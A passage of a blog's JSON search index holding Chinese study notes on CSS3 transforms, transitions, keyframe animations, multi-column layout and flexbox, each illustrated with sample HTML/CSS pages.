27px; display: inline-block; background: url(&quot;./imgs/sprites2.png&quot;) -73px -6px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt; &lt;li&gt;&lt;span class=&quot;icon1&quot;&gt;&lt;/span&gt;表项1&lt;/li&gt; &lt;li&gt;&lt;span class=&quot;icon2&quot;&gt;&lt;/span&gt;表项2&lt;/li&gt; &lt;li&gt;&lt;span class=&quot;icon3&quot;&gt;&lt;/span&gt;表项3&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"PthotoShop","slug":"PthotoShop","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/PthotoShop/"}]},{"title":"CSS属性-动画","slug":"前端学习11","date":"2021-05-05T15:25:53.000Z","updated":"2021-05-07T13:30:14.560Z","comments":true,"path":"2021/05/05/前端学习11/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/05/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A011/","excerpt":"","text":"第八章 CSS3属性-动画课程提要 盒子的变形 CSS3过渡 CSS3动画 8.1盒子的变形transform属性向元素应用2D或者3D转换。该属性允许我们对元素进行旋转、缩放、移动或者倾斜。 8.1.1 CSS3 2D变形2D Transform方法 函数 描述 matrix(n,n,n,n,n,n) 定义2D转换，使用六个值得矩阵。 translate(x,y) 定义2D转换，沿着X和Y轴移动元素。（位移） translateX(n) 定义2D转换，沿着X轴移动元素。 translateY(n) 定义2D转换，沿着Y轴移动元素。 scale(x,y) 定义2D缩放转换，改变元素的宽度和高度。（缩放） scaleX(n) 定义2D缩放转换，改变元素的宽度。 scaleY(n) 定义2D缩放转换，改变元素的高度。 rotate(angle) 定义2D旋转，在参数中规定角度。(-360deg ~ 360deg) （旋转） skew(x-angle,y-angle) 定义2D倾斜转换，沿着X和Y轴。 （变形） skewX(angle) 定义2D倾斜转换，沿着X轴。 skewY(angle) 定义2D倾斜转换，沿着Y轴。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .box&#123; width: 200px; height: 200px; background-color: red; /*-webkit-transform: translate(100px,200px);!*兼容谷歌和苹果*!*/ /*-moz-transform: translate(100px,200px);!*兼容火狐*!*/ /*-ms-transform: translate(100px,200px);!*兼容IE*!*/ /*-o-transform: translate(100px,200px);!*兼容opera浏览器*!*/ /*transform: translate(100px,200px);!*兼容W3C浏览器*!*/ /*可以为负值*/ /*-webkit-transform: translate(-100px,200px);!*兼容谷歌和苹果*!*/ /*-moz-transform: translate(-100px,200px);!*兼容火狐*!*/ /*-ms-transform: translate(-100px,200px);!*兼容IE*!*/ /*-o-transform: translate(-100px,200px);!*兼容opera浏览器*!*/ /*transform: translate(-100px,200px);!*兼容W3C浏览器*!*/ /*!*只带一个参数，该参数代表的是X方向位移为位移值，y方向位移值为0*!*/ /*-webkit-transform: translate(100px);!*兼容谷歌和苹果*!*/ /*-moz-transform: translate(100px);!*兼容火狐*!*/ /*-ms-transform: translate(100px);!*兼容IE*!*/ /*-o-transform: translate(100px);!*兼容opera浏览器*!*/ /*transform: translate(100px);!*兼容W3C浏览器*!*/ /*-webkit-transform: translateX(100px);!*兼容谷歌和苹果*!*/ /*-moz-transform: translateX(100px);!*兼容火狐*!*/ /*-ms-transform: translateX(100px);!*兼容IE*!*/ /*-o-transform: translateX(100px);!*兼容opera浏览器*!*/ /*transform: translateX(100px);!*兼容W3C浏览器*!*/ -webkit-transform: translateY(100px);/*兼容谷歌和苹果*/ -moz-transform: translateY(100px);/*兼容火狐*/ -ms-transform: translateY(100px);/*兼容IE*/ -o-transform: translateY(100px);/*兼容opera浏览器*/ transform: translateY(100px);/*兼容W3C浏览器*/ &#125; &lt;/style&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 2D变换&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 2D动画&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .box&#123; width: 200px; height: 200px; background-color: #8080ff; margin: 200px auto; /* 2个参数：第一个参数为横向放缩比例，第二个参数为纵向放缩比例。 1个参数；纵向和横向放缩比例均为参数值。 */ /*-webkit-transform: scale(2);*/ /*-moz-transform: scale(2);*/ /*-ms-transform: scale(2);*/ /*-o-transform: scale(2);*/ /*transform: scale(2);*/ /*-webkit-transform: scaleX(2);*/ /*-moz-transform: scaleX(2);*/ /*-ms-transform: scaleX(2);*/ /*-o-transform: scaleX(2);*/ /*transform: scaleX(2);*/ -webkit-transform: scaleY(2); -moz-transform: scaleY(2); -ms-transform: scaleY(2); -o-transform: scaleY(2); transform: scaleY(2); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 2D动画&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .box&#123; height: 200px; width: 200px; background-color: #8080ff; margin: 200px auto; /*顺时针旋转*/ /*-webkit-transform: rotate(10deg);*/ /*-moz-transform: rotate(10deg);*/ /*-ms-transform: rotate(10deg);*/ /*-o-transform: rotate(10deg);*/ /*transform: rotate(10deg);*/ /*rotate()取值范围-360deg ~ 360deg*/ -webkit-transform: rotate(-10deg); -moz-transform: rotate(-10deg); -ms-transform: rotate(-10deg); -o-transform: rotate(-10deg); transform: rotate(-10deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 2D转换&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .box&#123; height: 200px; width: 200px; background-color: #8080ff; margin: 200px auto; /*两个参数，前横后纵*/ /*-webkit-transform: skew(20deg,20deg);*/ /*-moz-transform: skew(20deg,20deg);*/ /*-ms-transform: skew(20deg,20deg);*/ /*-o-transform: skew(20deg,20deg);*/ /*transform: skew(20deg,20deg);*/ /*一个参数，仅仅是横向偏移*/ /*-webkit-transform: skew(20deg);*/ /*-moz-transform: skew(20deg);*/ /*-ms-transform: skew(20deg);*/ /*-o-transform: skew(20deg);*/ /*transform: skew(20deg);*/ /*纵向扭曲*/ /*-webkit-transform: skewY(20deg);*/ /*-moz-transform: skewY(20deg);*/ /*-ms-transform: skewY(20deg);*/ /*-o-transform: skewY(20deg);*/ /*transform: skewY(20deg);*/ /*纵向扭曲*/ -webkit-transform: skewX(20deg); -moz-transform: skewX(20deg); -ms-transform: skewX(20deg); -o-transform: skewX(20deg); transform: skewX(20deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; matrix(a,b,c,d,e,f)方法matrix()方法将所有2D转换方法组合在一起。 matrix()方法需要六个参数，包含数学函数，允许：旋转、缩放、移动以及倾斜元素。 定义2D变形转换，使用了六个值得矩阵，表示如下： a c e b d f 0 0 1 matrix用一个3行3列的矩阵表示。 a和d：表示缩放，如果没有缩放，值为1 b和c：表示扭曲，如果没有扭曲，值为0 e和f：表示位移，如果没有位移，值为0 如果旋转角度为θ，它影响到a\\b\\c\\d的值： a = cosθ b = sinθ c = -sinθ d = cosθ 如果扭曲skew(θ1,θ2)，会影响到b和c的值： b = tanθ1 c = tanθ2 每次旋转和扭曲都会产生一个新的矩阵，最终形成的多个矩阵要做乘法运算。 如果对一个元素同时有旋转、扭曲、缩放和位移，这时需要用到多个矩阵相乘，但是要优先考虑旋转和缩放！！！！！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;matrix()方法&lt;/title&gt; &lt;style&gt; /*需求：将div右移100px，下移200px，旋转30deg，x轴缩放1.5倍，y轴缩放2倍。*/ .box&#123; width: 200px; height: 150px; background-color: red; margin: 200px auto; color: white; /*!*方法一：*!*/ /*-webkit-transform: translate(100px,200px) scale(1.5,2.0) rotate(30deg);*/ /*-moz-transform: translate(100px,200px) scale(1.5,2.0) rotate(30deg);*/ /*-ms-transform: translate(100px,200px) scale(1.5,2.0) rotate(30deg);*/ /*-o-transform: translate(100px,200px) scale(1.5,2.0) rotate(30deg);*/ /*transform: translate(100px,200px) scale(1.5,2.0) rotate(30deg);*/ /*方法2：*/ /*解法： 1.缩放（1.5，2.0），形成一个矩阵a。 [1.5 0 0 0 2 0 0 0 1] 2.旋转30deg后，形成一个矩阵b。 [0.866 -0.5 0 0.5 0.866 0 0 0 1] 3.上面两个矩阵相乘，做乘法运算a*b。 [0.866 -0.5 0 [1.5 0 0 [1.299 -1 0 0.5 0.866 0 * 0 2 0 = 0.75 1.732 0 0 0 1] 0 0 1] 0 0 1] 4.带入偏移即可 [1.299 -1 100 0.75 1.732 200 0 0 1] */ -webkit-transform: matrix(1.299,0.75,-1,1.732,100,200); -moz-transform: matrix(1.299,0.75,-1,1.732,100,200); -ms-transform: matrix(1.299,0.75,-1,1.732,100,200); -o-transform: matrix(1.299,0.75,-1,1.732,100,200); transform: matrix(1.299,0.75,-1,1.732,100,200); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; matrix()函数 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transform-origin属性：调整元素的基点允许改变被转换元素的位置 语法 1transform-origin: x-axis y-axis c-axis; 属性值： x-axis：定义视图被置于X轴的何处。可能值：left/center/right/length/% y-axis：定义视图被置于Y轴的何处。可能值：top/center/bottom/length/% z-axis：定义视图被置于Z轴的何处。可能值：length 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;transform-origin&lt;/title&gt; &lt;style&gt; .container&#123; height: 300px; width: 400px; margin: 200px auto; border: 3px solid salmon; &#125; .box&#123; width: 200px; height: 200px; background-color: #8080ff; -webkit-transform: rotate(30deg); -moz-transform: rotate(30deg); -ms-transform: rotate(30deg); -o-transform: rotate(30deg); transform: rotate(30deg); /*默认旋转中心：(x/2,y/2)处/对角线交点*/ -webkit-transform-origin: 0 0; -moz-transform-origin: 0 0; -ms-transform-origin: 0 0; -o-transform-origin: 0 0; transform-origin: 0 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 8.1.2 CSS3 3D变形perspective perspective属性 perspective属性定义3D元素视距的距离，以像素计。该属性允许您改变3D元素查看3D元素的视图。当为元素定义perspective属性时，其子元素会获得透视效果，而不是元素本身。 注意：perspective属性只影响3D转换元素。 语法： 1perspective: number|none; number：元素距离视图的距离，以像素计。 none：默认值，与0相同，不设置透视。 主流浏览器都不支持，谷歌要加-webkit，或在长度后带单位。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;perspective属性&lt;/title&gt; &lt;style&gt; .father&#123; position: relative; width: 200px; height: 200px; padding: 10px; margin: 200px auto; border: 3px solid #8080ff; &#125; .son&#123; width: 100px; height: 50px; padding: 50px; position: absolute; background-color: #00ffff; -webkit-transform: rotateX(45deg); -moz-transform: rotateX(45deg); -ms-transform: rotateX(45deg); -o-transform: rotateX(45deg); transform: rotateX(45deg); &#125; .father:hover&#123; -webkit-perspective: 150px; -moz-perspective: 150px; -ms-perspective: 150px; perspective: 150px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;father&quot;&gt; &lt;div class=&quot;son&quot;&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transform-styletransform-style属性规定如何在3D空间中呈现被嵌套元素(子元素)。 注意：该属性必须和transform属性一起使用。 语法： 1transform-style: flat|preserve-3d; flat：子元素将不保留其3D位置。 preserve-3d：子元素将保留其3D位置。 rotate方法rotateX rotateY rotateZ：3D空间旋转指定角度，沿着垂直于Z轴的方向顺时针旋转。 X、Y、Z轴的三维立体感！！！X平行纸面，Y平行直面。Z垂直纸面。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;绘制立方体&lt;/title&gt; &lt;style&gt; .container&#123; width: 200px; height: 200px; position: relative; -webkit-perspective: 500px; -moz-perspective: 500px; -ms-perspective: 500px; perspective: 500px; margin: 200px auto; &#125; .box div&#123; position: absolute; border: 3px solid #00ffff; &#125; .front,.back&#123; width: 300px; height: 200px; /*background-color: #8080ff;*/ &#125; .left,.right&#123; width: 100px; height: 200px; left: 100px; /*background-color: deeppink;*/ &#125; .top,.bottom&#123; width: 300px; height: 100px; top: 50px; /*background-color: salmon;*/ &#125; .front&#123; -webkit-transform: rotateY(0) translateZ(50px); -moz-transform: rotateY(0) translateZ(50px); -ms-transform: rotateY(0) translateZ(50px); -o-transform: rotateY(0) translateZ(50px); transform: rotateY(0) translateZ(50px); &#125; .back&#123; -webkit-transform: rotateY(180deg) translateZ(50px); -moz-transform: rotateY(180deg) translateZ(50px); -ms-transform: rotateY(180deg) translateZ(50px); -o-transform: rotateY(180deg) translateZ(50px); transform: rotateY(180deg) translateZ(50px); &#125; .left&#123; -webkit-transform: rotateY(-90deg) translateZ(150px); -moz-transform: rotateY(-90deg) translateZ(150px); -ms-transform: rotateY(-90deg) translateZ(150px); -o-transform: rotateY(-90deg) translateZ(150px); transform: rotateY(-90deg) translateZ(150px); &#125; .right&#123; -webkit-transform: rotateY(90deg) translateZ(150px); -moz-transform: rotateY(90deg) translateZ(150px); -ms-transform: rotateY(90deg) translateZ(150px); -o-transform: rotateY(90deg) translateZ(150px); transform: rotateY(90deg) translateZ(150px); &#125; .top&#123; -webkit-transform: rotateX(90deg) translateZ(100px); -moz-transform: rotateX(90deg) translateZ(100px); -ms-transform: rotateX(90deg) translateZ(100px); -o-transform: rotateX(90deg) translateZ(100px); transform: rotateX(90deg) translateZ(100px); &#125; .bottom&#123; -webkit-transform: rotateX(-90deg) translateZ(100px); -moz-transform: rotateX(-90deg) translateZ(100px); -ms-transform: rotateX(-90deg) translateZ(100px); -o-transform: rotateX(-90deg) translateZ(100px); transform: rotateX(-90deg) translateZ(100px); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;front&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;back&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;3&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;4&lt;/div&gt; &lt;div class=&quot;top&quot;&gt;5&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;6&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 8.2 CSS3过渡transition属性是个简写属性，用于设置四个过渡属性。 transition-property：属性名（单个或者一个列表）/all transition-duration：动画持续时间 transition-timing-function：动画函数 transition-delay：动画延时时间 第一个、第二个属性是必不可少的。 注释：请始终设置transition-duration属性，否则为0，就不会产生过渡效果。 简洁用法： 1xxxxxxxxxx xxxxxxxxxx transition: property duration timing-function delay 可以使用的属性： 颜色：color background-color border-color outline-color 位置：background-position left right top bottom 长度：max-height max-width min-height min-width width height border-width margin padding outline-width outline-offset font-size line-height text-indent vertical-align border-spacing letter-spacing word-spacing border-spacing 数字：opacity visibility z-index font-weight zoom 组合：text-shadow transform box-shadow clip 其他：gradient 动画持续时间：一般以秒s/毫秒ms为单位 动画函数： linear：匀速 ease：变速（先加速再减速） ease-in：变速（加速） ease-out：变速（减速） ease-in-out：变速（慢速开始,中间未知，慢速结束） cubic-bezier(n,n,n,n)：自行设定变速，n的值在0~1之间 动画延时时间：以秒或毫秒为单位。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;transition过渡动画&lt;/title&gt; &lt;style&gt; .box&#123; width: 100%; height: 800px; position: relative; border: 1px solid blueviolet; &#125; .demo&#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 100px; top: 100px; /*-webkit-transition: all 3s ease 1s;*/ /*-moz-transition: all 3s ease 1s;*/ /*-ms-transition: all 3s ease 1s;*/ /*-o-transition: all 3s ease 1s;*/ /*transition: all 3s ease 1s;*/ -webkit-transition: width 3s ease 1s,left 1s ease-in-out 0.5s; -moz-transition: width 3s ease 1s,left 1s ease-in-out 0.5s; -ms-transition: width 3s ease 1s,left 1s ease-in-out 0.5s; -o-transition: width 3s ease 1s,left 1s ease-in-out 0.5s; transition: width 3s ease 1s,left 1s ease-in-out 0.5s; -webkit-transform: rotate(45deg); -moz-transform: rotate(45deg); -ms-transform: rotate(45deg); -o-transform: rotate(45deg); transform: rotate(45deg); &#125; .box:hover .demo&#123; left: 500px; width: 300px; -webkit-transform: rotate(30deg); -moz-transform: rotate(30deg); -ms-transform: rotate(30deg); -o-transform: rotate(30deg); transform: rotate(30deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;demo&quot;&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 8.3 CSS3动画8.3.1 @keyframes通过@keyframes规则，可以创建动画，设置关键帧。 创建动画的原理：将一套CSS样式逐渐变化为另一套样式。 在动画过程中，可以多次改变这套样式。 以百分比来规定改变发生时间，或通过关键词”from”和”to”，等价于0%和100%。 0%是动画开始时间，100%动画的结束时间。 为了获得最佳的浏览器支持，应该始终定义0%和100%选择器。 注意：请使用动画属性来控制动画的外观，同时将动画与选择器绑定。 关键帧越多，动画越平滑。 步骤： 设置关键帧 只有两个关键帧 1234@keyframe 动画名&#123; 0%: &#123;初始样式表&#125;; 100%: &#123;结尾样式表&#125;;&#125; 1234@keyframe 动画名&#123; from: &#123;初始样式表&#125;; to: &#123;结尾样式表&#125;;&#125; 多个关键帧 12345@keyframe 动画名&#123; 0%: &#123;初始样式表&#125;; 百分比: &#123;对应样式表&#125;; 100%: &#123;结尾样式表&#125;;&#125; 注意：这里的百分比一般是升序值，可以是0%~100%之间的任意值，也可以是倒序。 实施动画 常规用法 animation-name：规定需要绑定到选择器的keyframe名称。 animation-duration：规定完成动画所花费的时间，以秒/毫秒计。 animation-timing-function：规定动画的速度曲线。 linear：匀速（默认值） ease：变速（先加速再减速） ease-in：变速（加速） ease-out：变速（减速） ease-in-out：变速（慢速开始,中间未知，慢速结束） cubic-bezier(n,n,n,n)：自行设定变速，n的值在0~1之间 animation-delay：规定动画开始之前的延迟。 animation-iteration-count：规定动画应该循环播放的次数。 number：按设定次数循环 infinite：无限循环 animation-direction：规定是否应该轮流反向播放动画。（默认为1次） normal：不反向 alternate：反向 animation-play-state：动画是否播放或停止播放 paused：停止播放 running：播放（默认） 简洁用法 12animation: name,duration,timing-function,delay,iteration-count,direction;animation-play-state: ; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;关键帧动画&lt;/title&gt; &lt;style&gt; .box&#123; width: 100%; height: 800px; position: relative; &#125; .demo&#123; width: 100px; height: 100px; border: #8080ff 1px solid; -webkit-border-radius: 50%; -moz-border-radius: 50%; border-radius: 50%; position: absolute; -webkit-animation: move 1s ease-in-out 1s infinite alternate; -o-animation: move 1s ease-in-out 1s infinite alternate; animation: move 1s ease-in-out 1s infinite alternate; &#125; /*定义关键帧*/ @keyframes move &#123; 0%&#123; left: 100px; &#125; 30%&#123; left: 200px; background-color: #8080ff; &#125; 75%&#123; left: 400px; background-color: blueviolet; &#125; 100%&#123; left: 500px; background-color: #87faf8; &#125; &#125; @-webkit-keyframes move &#123; 0%&#123; left: 100px; &#125; 30%&#123; left: 200px; background-color: #8080ff; &#125; 75%&#123; left: 400px; background-color: blueviolet; &#125; 100%&#123; left: 500px; background-color: #87faf8; &#125; &#125; @-moz-keyframes move &#123; 0%&#123; left: 100px; &#125; 30%&#123; left: 200px; background-color: #8080ff; &#125; 75%&#123; left: 400px; background-color: blueviolet; &#125; 100%&#123; left: 500px; background-color: #87faf8; &#125; &#125; @-o-keyframes move &#123; 0%&#123; left: 100px; &#125; 30%&#123; left: 220px; background-color: #8080ff; &#125; 75%&#123; left: 400px; background-color: blueviolet; &#125; 100%&#123; left: 500px; background-color: #87faf8; &#125; &#125; @-ms-keyframes move &#123; 0%&#123; left: 100px; &#125; 30%&#123; left: 200px; background-color: #8080ff; &#125; 75%&#123; left: 400px; background-color: blueviolet; &#125; 100%&#123; left: 500px; background-color: #87faf8; &#125; &#125; .running:hover+.box .demo&#123; -webkit-animation-play-state: running; -moz-animation-play-state: running; -o-animation-play-state: running; animation-play-state: running; &#125; .stop:hover+.box .demo&#123; -webkit-animation-play-state: paused; -moz-animation-play-state: paused; -o-animation-play-state: paused; animation-play-state: paused; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;button class=&quot;running&quot;&gt;running&lt;/button&gt;&lt;button class=&quot;stop&quot;&gt;stop&lt;/button&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;demo&quot;&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"CSS属性-动画","slug":"前端学习12","date":"2021-05-05T15:25:53.000Z","updated":"2021-05-28T09:19:41.230Z","comments":true,"path":"2021/05/05/前端学习12/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/05/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A012/","excerpt":"","text":"第九章 基础属性-布局课程提要 多列布局 box布局 flex布局 响应式布局 媒体查询 Web字体 9.1 多列（分栏）尽管当前计算机的屏幕已经变得很宽了，研究表明，人们在阅读长文本时会感到困难（通常认为每行大概65~75个字符为最适合阅读的长度）。文本行长度的习惯导致了我们设计布局时存在一些限制，也导致网站无法充分利用宽屏所赋予的机会。多年来，杂志和报纸已经在使用多列布局使内容流动起来，这种布局解决了长文本行的处理以及如和把许多材料放入到有限的空间布局。 现在，随着CSS3中多列布局的出现，网站可以利用多列布局了。通过多列布局，能够创建多个列来对文本进行布局。 CSS3多列属性： column-count：规定元素应该被分隔的列数/栏数。 1column-count: number|auto; column-gap：规定列之间的间隔。 1column-gap: ?px|normal|%; column-rule：设置所有column-rule-*属性的简写属性。（设置分栏间隔线） column-rule-style：设置线型。 none：没有分隔线（默认） hidden：隐藏 dotted：点状 dashed：虚线 solid：实线 double：双线 ridge：定义3D ridge规则。该效果取决于宽度和颜色值。(3D沟槽效果) groove：定义3D groove规则。该效果取决于宽度和颜色值。（3D脊状效果） inset：定义3D inset规则。该效果取决于宽度和颜色值。（3D左上角阴影） outset：定义3D outset规则。该效果取决于宽度和颜色值。（3D右上角阴影） 3D线型在分栏中没有效果，当实线处理。 column-rule-width：设置线宽。 column-rule-color：设置分隔线颜色。 简洁/复合写法： 1column-rule: width style color; column-width：规定列的宽度。 1column-width: length|auto; columns：规定设置column-width和column-count的简写属性。 记得加兼容！ 1columns: column-width column-count; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;分栏&lt;/title&gt; &lt;style&gt; p&#123; /*分栏数*/ -webkit-column-count: 3; -moz-column-count: 3; column-count: 3; /*栏间距*/ -webkit-column-gap: 50px; -moz-column-gap: 50px; column-gap: 50px; /*栏间分隔线*/ -webkit-column-rule-style: groove; -moz-column-rule-style: groove; column-rule-style: groove; /*设置分隔线线宽*/ -webkit-column-rule-width: 50px; -moz-column-rule-width: 50px; column-rule-width: 50px; -webkit-column-rule-color: #87faf8; -moz-column-rule-color: #87faf8; column-rule-color: #87faf8; /*设置栏宽*/ -webkit-column-width: 50px; -moz-column-width: 50px; column-width: 50px; &#125; .box&#123; width: 200px; height: 200px; border: 20px groove #8080ff;/*3D*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; 习近平主席对巴赫连任国际奥委会主席表示祝贺，表示在巴赫主席领导下，国际奥委会团结各方力量，推动奥林匹克运动蓬勃发展。新冠肺炎疫情发生以来，国际奥委会做了不少工作，为全球团结抗疫提供了正能量。疫情对奥运会等体育盛会造成很大影响。中方愿继续配合国际奥委会，支持举办东京奥运会。中方愿同国际奥委会加强疫苗合作，共同构建保护运动员安全参赛的有效屏障。 习近平主席强调，中方正在围绕如期举办北京冬奥会、冬残奥会目标，稳步推进各项筹办工作。目前，所有竞赛场馆全部完工，赛事组织和场馆运行有序开展，赛会服务保障工作加快推进，宣传推广和文化活动有序推进。中方举办了雪上项目、冰上项目测试活动，对办赛涉及的关键要素进行了有效检验。中方将组织好下半年各项测试赛，为北京冬奥会、冬残奥会打下更加坚实的基础。 习近平主席强调，北京冬奥会、冬残奥会是世界各国的盛会，是全球运动员公平竞技的舞台。感谢国际奥委会为北京冬奥会、冬残奥会筹办提供积极支持和指导。中方对北京冬奥会、冬残奥会如期成功举行充满信心，愿同国际奥委会和国际社会一道，确保北京冬奥会、冬残奥会成为一届简约、安全、精彩的奥运盛会。 巴赫表示，祝贺中国各领域发展取得骄傲的成就，特别是中国率先成功抗击新冠肺炎疫情、率先恢复经济增长，为全球抗疫合作和经济复苏发挥了重要引领作用。国际奥委会高度重视同中方的良好合作，愿同中方加强疫苗合作。当前北京冬奥会筹备工作处于重要阶段。国际奥委会坚守《奥林匹克宪章》，反对将奥林匹克运动政治化，愿同中方继续密切合作，全力支持中方如期举办北京冬奥会、冬残奥会。相信北京冬奥会、冬残奥会将向世界展现抗击疫情的榜样力量，推动世界冰雪运动发展，为奥林匹克运动发展作出重要贡献。&lt;/p&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 9.2 flex布局弹性盒子是CSS3的一种新的布局模式。CSS3弹性盒子(Flexible Box)，是一种当页面需要适应不同的屏幕大小以及设备类型时确保元素拥有恰当的行为的布局方式。引入弹性盒布局模型的目的是提供一种更加有效的方式来对一个容器的子元素进行排列、对齐和分配空白空间。 9.2.1 弹性盒子定义方式弹性容器通过设置display属性的值为flex或者inline-flex将其定义为弹性容器。 弹性盒子只定义了弹性元素如何在弹性容器内布局。 弹性子元素通常在弹性盒子内一行显示。默认情况：每个容器只有一行。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Flex Box弹性布局&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .menu&#123; width: 100%; height: 100px; line-height: 44px; display: -webkit-flex;/*兼容*/ display: -moz-flex;/*兼容*/ display: -o-flex;/*兼容*/ display: -ms-flex;/*兼容*/ display: flex; font-size: 40px; position: fixed; bottom: 0; &#125; .menu li&#123; list-style-type: none; width: 20%; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class=&quot;menu&quot;&gt; &lt;li&gt;菜单项1&lt;/li&gt; &lt;li&gt;菜单项2&lt;/li&gt; &lt;li&gt;菜单项3&lt;/li&gt; &lt;li&gt;菜单项4&lt;/li&gt; &lt;li&gt;菜单项5&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 常用属性： flex-direction：指定了弹性子元素在父元素中的位置。此属性作用于父容器。 语法 1flex-direction: row|row-reserve|column|column-reserve; row：横向从左到右排列（左对齐），默认的排列方式。 row-reserve：反转横向排列（右对齐，从后往前排，最后一项排在最前面。） column：纵向排列。 column-reserve：反向纵向排列，从后往前排，最后一项排在最上面。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE 